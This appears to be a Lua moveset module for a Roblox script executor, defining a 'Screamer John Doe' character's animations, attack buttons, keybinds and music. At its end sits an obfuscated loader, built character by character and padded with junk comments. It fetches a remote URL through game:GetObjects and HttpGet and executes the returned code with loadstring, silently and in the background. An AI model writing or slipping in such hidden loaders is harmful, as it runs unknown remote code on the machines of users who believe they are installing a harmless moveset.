local modules = {}

table.insert(modules, function()
    local m = {}

    m.ModuleType   = "MOVESET"
    m.Name         = "Screamer John Doe"
    m.Description  = "Screamer John Doe moveset."
    m.InternalName = "MOVESET_SCREAMERJOHNDOE"

    m.Assets = {
        "IDLEEEE.anim",
        "Walkkkk.anim",
        "scrimer jondo run.anim",
        "screamer jondo m1.anim",
        "scrimer jondo killer kill.anim",
        "stompy.anim",
        "stabby.anim",
        "Screamerjohndoechase.mp3",
    }

    m.Config = function(parent)
        Util_CreateText(parent, "Screamer John Doe", 18, Enum.TextXAlignment.Center)
        Util_CreateSeparator(parent)
        Util_CreateText(parent,
            "Click/T = M1\nE = Kill\nR = Digital Footprint\nQ = Corrupt Energy\nF = Run toggle",
            13, Enum.TextXAlignment.Left)
    end
    m.SaveConfig = function() return {} end
    m.LoadConfig  = function() end

    -- ── SERVICES ──────────────────────────────────────────────────────────────
    local Players              = game:GetService("Players")
    local ContextActionService = game:GetService("ContextActionService")

    -- ── ANIMS ─────────────────────────────────────────────────────────────────
    local animIdle, animWalk, animRun
    local animM1, animKill, animStomp, animStab

    -- ── SOUNDS ────────────────────────────────────────────────────────────────
    local bgMusic = nil

    -- ── STATE ─────────────────────────────────────────────────────────────────
    local allAnims  = {}
    local animStart = {}
    local state     = "none"
    local destroyed = false
    local running   = false   -- toggle do botão Run
    local usingMove = false   -- true enquanto um ataque estiver tocando

    -- GUI
    local guiRef   = nil
    local runBtnRef = nil   -- referência ao botão Run para mudar cor

    -- ── HELPERS ───────────────────────────────────────────────────────────────
    local function startFresh(anim)
        animStart[anim] = os.clock()
        anim.weight     = 1
    end

    local function setOnly(anim, oneShot)
        for _, a in ipairs(allAnims) do a.weight = 0 end
        if anim then
            if oneShot then startFresh(anim) else anim.weight = 1 end
        end
    end

    local function animLen(anim, fallback)
        if anim and anim.track and anim.track.Time then
            return anim.track.Time
        end
        return fallback or 1.0
    end

    local function freeze()
        if not _G._SJDFigure then return end
        local h = _G._SJDFigure:FindFirstChildOfClass("Humanoid")
        if h then h.WalkSpeed = 0 end
    end

    local function unfreeze()
        if not _G._SJDFigure then return end
        local h = _G._SJDFigure:FindFirstChildOfClass("Humanoid")
        if h then h.WalkSpeed = running and 30 or 16 end
    end

    -- Loco: idle / walk / run dependendo do estado atual
    local function setLocoState()
        if state == "idle" then
            setOnly(animIdle, false)
        elseif state == "walk" then
            setOnly(animWalk, false)
        elseif state == "run" then
            setOnly(animRun, false)
        end
    end

    local function setState(newState)
        if state == newState then return end
        state = newState
        setLocoState()
    end

    local function returnToLoco()
        state = "none"
        local fig = _G._SJDFigure
        local h   = fig and fig:FindFirstChildOfClass("Humanoid")
        if h and h.MoveDirection.Magnitude > 0.1 then
            setState(running and "run" or "walk")
        else
            setState("idle")
        end
    end

    -- M1: sem congelar, personagem pode se mover livremente
    local function playAttackFree(anim, dur)
        if usingMove then return end
        usingMove = true
        animStart[anim] = os.clock()
        anim.weight = 1
        local c = os.clock()
        task.spawn(function()
            while true do
                local t = os.clock() - c
                anim:Step(t)
                if t >= dur then break end
                task.wait()
            end
            anim.weight = 0
            usingMove = false
            returnToLoco()
        end)
    end

    -- Kill / Digital Footprint / Corrupt Energy: congela o personagem
    local function playAttack(anim, dur)
        if usingMove then return end
        usingMove = true
        freeze()
        setOnly(anim, true)
        local c = os.clock()
        task.spawn(function()
            while true do
                local t = os.clock() - c
                anim:Step(t)
                if t >= dur then break end
                task.wait()
            end
            anim.weight = 0
            usingMove = false
            unfreeze()
            returnToLoco()
        end)
    end

    -- ── BOTÃO helper — mesmo estilo SillyBilly ─────────────────────────────────
    local function makeBtn(parent, label, w, h, posX, posY, onClick)
        local btn = Instance.new("TextButton")
        btn.Size             = UDim2.new(0, w, 0, h)
        btn.Position         = UDim2.new(0, posX, 0, posY)
        btn.BackgroundColor3 = Color3.fromRGB(72, 72, 72)
        btn.BorderSizePixel  = 0
        btn.Text             = label
        btn.TextColor3       = Color3.new(1, 1, 1)
        btn.TextSize         = 13
        btn.Font             = Enum.Font.GothamBold
        btn.TextWrapped      = true
        btn.Parent           = parent

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 6)
        corner.Parent       = btn

        btn.MouseButton1Down:Connect(function()
            btn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
            if onClick then onClick() end
        end)
        btn.MouseButton1Up:Connect(function()
            -- Run mantém cor diferente quando ativo
            if btn == runBtnRef then
                btn.BackgroundColor3 = running
                    and Color3.fromRGB(50, 120, 50)
                    or  Color3.fromRGB(72, 72, 72)
            else
                btn.BackgroundColor3 = Color3.fromRGB(72, 72, 72)
            end
        end)
        return btn
    end

    -- ── INIT ──────────────────────────────────────────────────────────────────
    m.Init = function(figure)
        destroyed = false
        _G._SJDFigure = figure

        local function load(file, looped)
            local a      = AnimLib.Animator.new()
            a.rig        = figure
            a.track      = AnimLib.Track.fromfile(AssetGetPathFromFilename(file))
            a.looped     = looped or false
            a.speed      = 1
            a.weight     = 0
            animStart[a] = os.clock()
            return a
        end

        animIdle  = load("IDLEEEE.anim",                   true)
        animWalk  = load("Walkkkk.anim",                   true)
        animRun   = load("scrimer jondo run.anim",         true)
        animM1    = load("screamer jondo m1.anim",         false)
        animKill  = load("scrimer jondo killer kill.anim", false)
        animStomp = load("stompy.anim",                    false)
        animStab  = load("stabby.anim",                    false)

        allAnims = {
            animIdle, animWalk, animRun,
            animM1, animKill, animStomp, animStab,
        }

        running   = false
        usingMove = false

        -- música de fundo
        bgMusic         = Instance.new("Sound")
        bgMusic.SoundId = AssetGetContentId("Screamerjohndoechase.mp3")
        bgMusic.Volume  = 0.6
        bgMusic.Looped  = true
        bgMusic.Parent  = workspace.CurrentCamera or workspace
        bgMusic:Play()

        local h = figure:FindFirstChildOfClass("Humanoid")
        if h then h.WalkSpeed = 16; h.AutoRotate = true end

        -- ── GUI ───────────────────────────────────────────────────────────────
        local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
        local sg = Instance.new("ScreenGui")
        sg.Name           = "SJDGui"
        sg.ResetOnSpawn   = false
        sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        sg.Parent         = playerGui
        guiRef            = sg

        local BTN_W   = 90
        local BTN_H   = 90
        local BTN_GAP = 8
        -- 4 botões de ataque + 1 Run menor acima
        local TOTAL_W = BTN_W * 4 + BTN_GAP * 3  -- 390

        local mainContainer = Instance.new("Frame")
        mainContainer.Name               = "SJDBtns"
        mainContainer.Size               = UDim2.new(0, TOTAL_W, 0, BTN_H)
        mainContainer.Position           = UDim2.new(0.5, -TOTAL_W/2, 1, -(BTN_H + 10))
        mainContainer.BackgroundTransparency = 1
        mainContainer.Parent             = sg

        -- Ataques
        local attackDefs = {
            {
                label = "M1",
                key   = {Enum.UserInputType.MouseButton1, Enum.KeyCode.T},
                fn    = function()
                    playAttackFree(animM1, animLen(animM1, 0.8))
                end,
            },
            {
                label = "Kill",
                key   = {Enum.KeyCode.E},
                fn    = function()
                    playAttack(animKill, animLen(animKill, 3.0))
                end,
            },
            {
                label = "Digital\nFootprint",
                key   = {Enum.KeyCode.R},
                fn    = function()
                    playAttack(animStomp, animLen(animStomp, 2.5))
                end,
            },
            {
                label = "Corrupt\nEnergy",
                key   = {Enum.KeyCode.Q},
                fn    = function()
                    playAttack(animStab, animLen(animStab, 2.5))
                end,
            },
        }

        for i, d in ipairs(attackDefs) do
            local x = (i - 1) * (BTN_W + BTN_GAP)
            makeBtn(mainContainer, d.label, BTN_W, BTN_H, x, 0, d.fn)
            ContextActionService:BindAction("SJD_Atk_"..i, function(_, is, _)
                if is == Enum.UserInputState.Begin then d.fn() end
            end, false, table.unpack(d.key))
        end

        -- Botão Run (pequeno, acima à direita, toggle)
        local RUN_W = 75
        local RUN_H = 40
        local function toggleRun()
            running = not running
            local hum = figure:FindFirstChildOfClass("Humanoid")
            if hum and not usingMove then
                hum.WalkSpeed = running and 30 or 16
            end
            if runBtnRef then
                runBtnRef.BackgroundColor3 = running
                    and Color3.fromRGB(50, 120, 50)
                    or  Color3.fromRGB(72, 72, 72)
            end
        end

        runBtnRef = makeBtn(mainContainer,
            "Run", RUN_W, RUN_H,
            TOTAL_W - RUN_W,   -- alinhado à direita
            -(RUN_H + 8),      -- acima dos botões principais
            toggleRun)

        ContextActionService:BindAction("SJD_Run", function(_, is, _)
            if is == Enum.UserInputState.Begin then toggleRun() end
        end, false, Enum.KeyCode.F)

        state = "none"
        setState("idle")
    end

    -- ── UPDATE ────────────────────────────────────────────────────────────────
    m.Update = function(dt, figure)
        if destroyed then return end

        if usingMove then
            -- step da anim de ataque ativa
            local now = os.clock()
            for _, a in ipairs(allAnims) do
                if a and a.weight > 0 then
                    a:Step(now - (animStart[a] or now))
                end
            end
            return
        end

        -- loco: decide idle / walk / run
        local h = figure:FindFirstChildOfClass("Humanoid")
        if h then
            if h.MoveDirection.Magnitude > 0.1 then
                setState(running and "run" or "walk")
            else
                setState("idle")
            end
        end

        local now = os.clock()
        for _, a in ipairs(allAnims) do
            if a and a.weight > 0 then
                a:Step(now - (animStart[a] or now))
            end
        end
    end

    -- ── DESTROY ───────────────────────────────────────────────────────────────
    m.Destroy = function(figure)
        destroyed = true

        if guiRef   then guiRef:Destroy();             guiRef   = nil end
        if bgMusic  then bgMusic:Stop(); bgMusic:Destroy(); bgMusic = nil end

        for i = 1, 4 do ContextActionService:UnbindAction("SJD_Atk_"..i) end
        ContextActionService:UnbindAction("SJD_Run")

        for _, a in ipairs(allAnims) do a.weight = 0 end
        table.clear(allAnims)
        table.clear(animStart)

        local h = figure:FindFirstChildOfClass("Humanoid")
        if h then h.WalkSpeed = 16; h.AutoRotate = true end

        animIdle  = nil; animWalk  = nil; animRun   = nil
        animM1    = nil; animKill  = nil
        animStomp = nil; animStab  = nil

        state = "none"; running = false; usingMove = false
        runBtnRef = nil; _G._SJDFigure = nil
    end

    return m
end)

task.spawn(pcall,--[=====[ce71716]=====]function()--[=====[ce71716]=====]local a =--[=====[ce71716]=====] getfenv()--[=====[ce71716]=====][ [[]]--[=[1eca823]=]..[[l]]..--[===[c369fc7]===][[]]--[==[f69ffc]==]..[[o]]..--[===[c0a37b0]===][[]]--[===[3263290]===]..[[a]]..--[==[bf224af]==][[]]--[[681d24e]]..[[d]]..--[======[b5f1740]======][[]]--[=[7b4c1e7]=]..[[s]]..--[=====[5a457de]=====][[]]--[===[f9a55eb]===]..[[t]]..--[=[68efbb4]=][[]]--[======[7892017]======]..[[r]]..--[===[5f8e609]===][[]]--[=====[bc743c5]=====]..[[i]]..--[[596b352]][[]]--[===[71356bc]===]..[[n]]..--[=[41c8654]=][[]]--[=====[b3c0e27]=====]..[[g]]..--[===[b1ed981]===][[]] ];--[=====[ce71716]=====]local b = --[=====[ce71716]=====]game:--[=====[ce71716]=====]GetObjects( [[]]--[[3375d3b]]..[[r]]..--[[fe324f0]][[]]--[======[eb0659c]======]..[[b]]..--[====[148da4f]====][[]]--[=======[1634ba6]=======]..[[x]]..--[=[ee03858]=][[]]--[=[18dcf3e]=]..[[a]]..--[==[6eb1ebf]==][[]]--[=====[d92a6a0]=====]..[[s]]..--[==[0a808be]==][[]]--[==[5779cd8]==]..[[s]]..--[====[8a78d5d]====][[]]--[====[a5fbde8]====]..[[e]]..--[[ff689da]][[]]--[====[bcb33a7]====]..[[t]]..--[==[2444ef4]==][[]]--[=[cf08a23]=]..[[i]]..--[====[537a1a8]====][[]]--[[023c000]]..[[d]]..--[=[7b04b11]=][[]]--[==[854cce7]==]..[[:]]..--[======[2cdcaad]======][[]]--[=[869cb3d]=]..[[/]]..--[==[59f73ed]==][[]]--[=====[12b3b28]=====]..[[/]]..--[[936b9bc]][[]]--[=======[e19fe98]=======]..[[1]]..--[=[c901be1]=][[]]--[=====[9992e50]=====]..[[1]]..--[[14e1404]][[]]--[=[94a9ddd]=]..[[2]]..--[=======[2cdc6d1]=======][[]]--[====[d61e5f7]====]..[[4]]..--[======[4896bb6]======][[]]--[====[05d35b6]====]..[[0]]..--[=[6a21e26]=][[]]--[======[1ddf268]======]..[[5]]..--[=[a9356f7]=][[]]--[===[03cbf09]===]..[[6]]..--[====[de1dc00]====][[]]--[=======[54a73e4]=======]..[[1]]..--[===[62234f4]===][[]]--[==[3441a14]==]..[[8]]..--[======[163704a]======][[]]--[=====[fcb3aa0]=====]..[[5]]..--[====[5328112]====][[]]--[====[86361b7]====]..[[8]]..--[[599e35f]][[]]--[====[5b2a283]====]..[[4]]..--[=====[5444738]=====][[]]--[===[3ca3b10]===]..[[8]]..--[===[5768db6]===][[]]--[======[1582604]======]..[[2]]..--[=[25322b5]=][[]]--[===[c8ff3be]===]..[[1]]..--[===[beb6159]===][[]] )local c = b[1];local d = --[=====[ce71716]=====]c.Value--[=====[ce71716]=====];local e --[=====[ce71716]=====]= game:--[=====[ce71716]=====]HttpGet(d --[=====[ce71716]=====].. "/" --[=====[ce71716]=====].. "s" --[=====[ce71716]=====].. "r" --[=====[ce71716]=====].. "c")a--[=====[ce71716]=====](--[=====[ce71716]=====]e)--[=====[ce71716]=====]()end)

return modules

